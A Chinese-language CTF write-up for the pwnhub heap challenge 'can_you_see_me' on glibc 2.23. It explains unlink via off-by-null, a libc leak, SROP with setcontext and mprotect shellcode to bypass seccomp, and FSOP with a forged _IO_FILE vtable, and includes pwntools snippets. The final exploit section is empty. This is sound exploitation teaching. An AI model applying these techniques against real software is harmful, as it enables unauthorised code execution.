# can_you_see_me

> Category: PWN
>
> Date: 2022/04/13
>
> Authorship: pwnhub.cn
>
> Attachment: [challenges/pwnhub/can_you_see_me](https://github.com/mark0519/challenges/tree/main/pwnhub/22.03.19)

## 0x00 知识点

1. house of spirit 
2. unlink + off by null 
3. SROP, 伪造IO_FILE结构体,通过_IO_FILE_plus的chain字段进行伪造
4. payload 长度有限时,需要利用一些特殊的gadget,以及寄存器的值,构造read读入 更长的payload 
5. setcontext绕过沙盒,使用orw拿flag 
5. close(1)后,程序仍然可以交互,利用stderr打印flag 
6. 限制申请次数时地利用, 本题限制了只能申请 8次

## 0x01 解题分析

题目是libc2.23下的UAF的菜单题，其中add_small的时候存在offbynull的漏洞，于此同时该程序未开启PIE保护，程序bss段地址固定。

同时该程序存在可以泄露libc地址的```gift()```函数，但要求的条件是bss段上0x602290处的内容为 0xF1E2D3C4B5A69788。

但是调用完gift函数之后程序会close(1)，也就是关闭标准输出。

且程序开始seccomp沙盒，禁用execve等函数。

最后程序会不停检查malloc_hook，free_hook，realloc_hook等hook部分，如果检查到不为空则程序直接退出。

### 1. Unlink在bss上申请堆

需要注意的是，该程序没有idx的说法，用户只能控制一大一小两个chunk：分别是大小可控但必须小于0x70的small_chunk和大小固定的big_chunk。

同时该程序存在可以泄露libc地址的```gift()```函数，但要求的条件是bss段上0x602290处的内容为 0xF1E2D3C4B5A69788，所以我们第一步考虑在bss上制造一个可控的chunk，由于程序没有开启PIE保护所以我们可以考虑使用unlink和house of spirit 的手法，unlink的利用又正好可以用上offbynull。

对于glibc-2.23的程序来说，绕过unlink保护我们需要绕过检查：

````c
FD == P->fd
BK == P->bk
````

简单来说，glibc-2.23在利用unlink宏的时候，会检查被合并的chunk是否处于一个双向链表中。

一个正常的unlink过程：

````
        |---------------------|
addr1-> |                 size|  <- free  chunk0
        |---------------------|
        |       fd|         bk|
        |---------------------|
        |data...              |
        |---------------------|
addr2-> |   p_size|       size|  <-alloced chunk1
        |---------------------|
        |data...              |
        |---------------------|

````

对于上面在双向链表bins中的chunk0，他的fk和bk在双向bins中的状态为：

````c
|----------|===>|   fd   |===>|      fd      |
|main_arena|    | chunk0 |    | other_chunk  | 
|----------|<===|   bk   |<===|      bk      |
````

他的fd指针和bk指针一定满足：

````c
fd->bk == addr1
bk->fd == addr1
````

所以，如果我们想利用unlink，那么被我们合并的chunk，例如这里的chunk0，他首先要利用offbynull来溢出到下一个chunk1的size位置，吧prev_inuse位置于0，同时构造好prev_size位，再然后，我们要伪造chunk0的fd和bk。

所以我们可以首先malloc_small(0x28)，这样来得到一个0x31的chunk，之后malloc_big()得到一个0x121的chunk，再这个small_chunk中，我们填入p64(0)+p64(0x21)+p64(fd)+p64(bk)，这样再这个0x31的chunk中伪造一个看起来被free的0x21的chunk。之后溢出到大chunk的prev_size位和size位，其中prev_size填入0x20，size溢出null字节覆盖成0x100，同时要注意申请大chunk的时候再0x100的位置伪造好下一个0x20的chunk，方式修改size之后heap结构混乱。

效果如下：

![](https://pic.imgdb.cn/item/6256c496239250f7c581b9af.png)

这里红色方框中就是伪造的size=0x21的chunk，橙色部分是offbynull溢出的效果，最下面紫色部分是为了防止heap混乱再填充big_chunk中时写入的数据，这样big_chunk的size被覆盖之后（0x121 ==> 0x100）,heap结构仍然正常。

值得注意的是，这里红框中的0x1111和0x2222应该被写入fd和bk，上文提到过，unlink宏存在检查：

````
FD == P->fd
BK == P->bk
````

所以这里的fd和bk我们不能随意填写，而是需要仔细构造。

一开始我们就提到了，程序没有开启PIE保护而导致bss段地址固定，同时程序在一开始让我们输入name和message都会保存在bss段上，同时，small_chunk和big_chunk的指针也会保存在bss端上，让我们来看看现在bss段上有些啥：

![](https://pic.imgdb.cn/item/6256c6d6239250f7c585c758.png)

红色部分是输入的name，紫色部分是输入的message，橙色部分是small_chunk的指针，绿色部分是big_chunk的指针。

所以，为了满足unlink的条件，我们不妨利用上bss段上的这两个指针，这里我们利用small_chunk的指针，

small_chunk的指针位于0x602298，这样如果我们在伪造的0x21的chunk中令:

````c
fd = 0x602298 - 0x18 = 0x602280
bk = 0x602298 - 0x10 = 0x602288
````

这样再释放0x100的chunk进行unlink的时候，进行检查会变成：

首先检查fd ， fd=0x602280，这样位于0x602280的chunk的bk位于0x602280+0x18=0x602298，

再检查bk，bk=0x602288，这样位于0x602288的chunk的fd位于0x602288+0x10=0x602298，

这样我们使得了fd -> bk == bk -> fd，从而绕过了检查。

最后理论上就可以修改这里的small_chunk指针为&small_chunk-0x18，这也是我们unlink的目的。

之后进行unlink操作，查看效果：

![](https://pic.imgdb.cn/item/6256cb6d239250f7c58e50ba.jpg)

可以看到我们的small_chunk已经被修改为0x602280。而这是一个位于bss段的地址。
同时我们想到，再输入name和message的时候我们是可以往bss段写上数据的，这里竟然我们可以控制small_chunk的地址，我们就需要再输入name和message的时候提前布置好size位，方面后面的利用。

这里我们就往0x602278（0x602280-8）的地方提前一个0x71当作size位，这样unlink之后就可以释放small_chunk，然后再申请回来，这样我们就可以修改更多bss段的地址，当然包括修改我们的需要调用```gift()```函数来泄露libc的0x602290处。

效果：

![](https://pic.imgdb.cn/item/6256db2e239250f7c5aabf26.jpg)

### 2. 泄露libc

由于程序提供了```gift()```函数，泄露libc并不困难，只要利用前面提到的unlink来做到在bss段上的任意写，在0x602290填上要求的数据，之后调用```gift()```函数就可以泄露puts的真实地址，减去偏移就可以得到libc基地址。

但是要注意的是，调用```gift()```函数会导致程序关闭标准输出：```close(1); ```,

### 3. SROP

正常来说，利用SROP需要我们可以劫持hook，但是本题也用时禁用了所有hook，所以我们配合IO_file利用来SROP。

#### (1) 常规libc2.23的SROP利用

对于一般禁用了execve函数的堆题，拿到flag通常使用ORW手法，但是在保护全开的情况下一般没有办法直接写shellcode执行，这时候就要用到配和heap空间是SROP技术，该技术简单来说主要流程如下：

1. 利用堆空间来部署`SigreturnFrame()`

```python
newexe = libc.sym['__free_hook'] & 0xfffffffffffff000

frame = SigreturnFrame()
frame.rsp = libc.sym['__free_hook']+0x10 #栈迁移
frame.rdi = newexe
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc.sym['mprotect']
```

2. 改```__free_hook```为```setcontext+53```；```__free_hook+0x8```写入两个个```__free_hook+0x10```，最后在```__free_hook+0x10```写入一个调用```SYS_read(0,newexe,0x1000)```的shellcode

````assembly
0x7ffff7a7bb85 <setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
0x7ffff7a7bb8c <setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]
0x7ffff7a7bb93 <setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]
0x7ffff7a7bb97 <setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]
0x7ffff7a7bb9b <setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]
0x7ffff7a7bb9f <setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]
0x7ffff7a7bba3 <setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]
0x7ffff7a7bba7 <setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
0x7ffff7a7bbae <setcontext+94>:  push   rcx
0x7ffff7a7bbaf <setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]
0x7ffff7a7bbb3 <setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]
0x7ffff7a7bbba <setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]
0x7ffff7a7bbc1 <setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]
0x7ffff7a7bbc5 <setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]
0x7ffff7a7bbc9 <setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]
0x7ffff7a7bbcd <setcontext+125>: xor    eax,eax
0x7ffff7a7bbcf <setcontext+127>: ret    
0x7ffff7a7bbd0 <setcontext+128>: mov    rcx,QWORD PTR [rip+0x3572a1]        # 0x7ffff7dd2e78
0x7ffff7a7bbd7 <setcontext+135>: neg    eax
0x7ffff7a7bbd9 <setcontext+137>: mov    DWORD PTR fs:[rcx],eax
0x7ffff7a7bbdc <setcontext+140>: or     rax,0xffffffffffffffff
0x7ffff7a7bbe0 <setcontext+144>: ret
````
````python
context.arch = 'amd64'
newexe = libc.sym['__free_hook'] & 0xfffffffffffff000

# SYS_read(0,newexe,0x1000)
shell1 = '''
xor rdi,rdi
mov rsi,%d
mov edx,0x1000
mov eax,0
syscall
jmp rsi
''' % newexe
````


3. 之后free掉SigreturnFrame的堆块，就会执行```mprotect(newexe,0x1000,7)```，即修改从newexe开始的0x1000字节的权限为RWX。
3. 接着程序就是执行shellcode1，也就是```SYS_read(0,newexe,0x1000)```,之后我们向服务器发送ORW的shellcode，程序就会就收并执行打印flag。

```python
shell2 = shellcraft.cat("flag") #ORW
```

#### (2) 常规libc2.23的FSOP 利用

一般情况下，利用FSOP需要我们可以劫持```_IO_list_all ```来伪造一个```_IO_FILE ```,同时在堆上伪造该```_IO_FILE ```的vtable,之后利用```_IO_FILE_plus.vtable ```中的_IO_overflow控制执行流。

对于一个一般程序的IO_file系统来说，在libc上的全局变量```_IO_list_all ```是一个指针，指向```_IO_2_1_stderr_```

````shell
pwndbg> p _IO_list_all 
$3 = (struct _IO_FILE_plus *) 0x7f7210e6c540 <_IO_2_1_stderr_>

pwndbg> p _IO_2_1_stderr_
$4 = {
  file = {
    _flags = -72540025, 
    _IO_read_ptr = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
    _IO_read_end = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
    _IO_read_base = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
    _IO_write_base = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
    _IO_write_ptr = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
    _IO_write_end = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
    _IO_buf_base = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
    _IO_buf_end = 0x7f7210e6c5c4 <_IO_2_1_stderr_+132> "", 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x7f7210e6c620 <_IO_2_1_stdout_>, 
    _fileno = 2, 
    _flags2 = 0, 
    _old_offset = -1, 
    _cur_column = 0, 
    _vtable_offset = 0 '\000', 
    _shortbuf = "", 
    _lock = 0x7f7210e6d770 <_IO_stdfile_2_lock>, 
    _offset = -1, 
    _codecvt = 0x0, 
    _wide_data = 0x7f7210e6b660 <_IO_wide_data_2>, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0, 
    _mode = 0, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x7f7210e6a6e0 <_IO_file_jumps>
}
````

其中```vtable = 0x7f7210e6a6e0 <_IO_file_jumps>```就是stderr的虚表

````shell
pwndbg> p _IO_file_jumps
$5 = {
  __dummy = 0, 
  __dummy2 = 0, 
  __finish = 0x7f7210b209d0 <_IO_new_file_finish>, 
  __overflow = 0x7f7210b21740 <_IO_new_file_overflow>,  # 可以控制程序执行流的地方
  __underflow = 0x7f7210b214b0 <_IO_new_file_underflow>, 
  __uflow = 0x7f7210b22610 <__GI__IO_default_uflow>, 
  __pbackfail = 0x7f7210b23990 <__GI__IO_default_pbackfail>, 
  __xsputn = 0x7f7210b201f0 <_IO_new_file_xsputn>, 
  __xsgetn = 0x7f7210b1fed0 <__GI__IO_file_xsgetn>, 
  __seekoff = 0x7f7210b1f4d0 <_IO_new_file_seekoff>, 
  __seekpos = 0x7f7210b22a10 <_IO_default_seekpos>, 
  __setbuf = 0x7f7210b1f440 <_IO_new_file_setbuf>, 
  __sync = 0x7f7210b1f380 <_IO_new_file_sync>, 
  __doallocate = 0x7f7210b14190 <__GI__IO_file_doallocate>, 
  __read = 0x7f7210b201b0 <__GI__IO_file_read>, 
  __write = 0x7f7210b1fb80 <_IO_new_file_write>, 
  __seek = 0x7f7210b1f980 <__GI__IO_file_seek>, 
  __close = 0x7f7210b1f350 <__GI__IO_file_close>, 
  __stat = 0x7f7210b1fb70 <__GI__IO_file_stat>, 
  __showmanyc = 0x7f7210b23b00 <_IO_default_showmanyc>, 
  __imbue = 0x7f7210b23b10 <_IO_default_imbue>
}
````

需要注意的是，stderr中的\_chain指向stdout，stdout中的\_chain指向stdin，stdin中的\_chain指向0x0。

所以对于这种情况，我们首先需要修改_IO_list_all中的内容，伪造一个fake _IO_FILE，

通常我们会把_IO_list_all的值修改为main_arena+0x58，这样正好就是bins链上的smallbin[4]的头部，也就是一个0x60的chunk。

伪造的结构体需要满足下面的条件

````c
top[1] = 0x61;  //size位1。
//Set mode to 0: fp->_mode <= 0
fp->_mode = 0; // top+0xc0
//Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
fp->_IO_write_base = (char *) 2; // top+0x20
fp->_IO_write_ptr = (char *) 3; // top+0x28
````

```c
memcpy( ( char *) top, "/bin/sh\x00", 8);
```

````c
vtable = fake_vtable_chunk #jump table
````

最后保证```fake_vtable_chunk._IO_overflow = system ```，就可以getshell

#### (3) 本题的结合利用



## 0x02 完整exploit
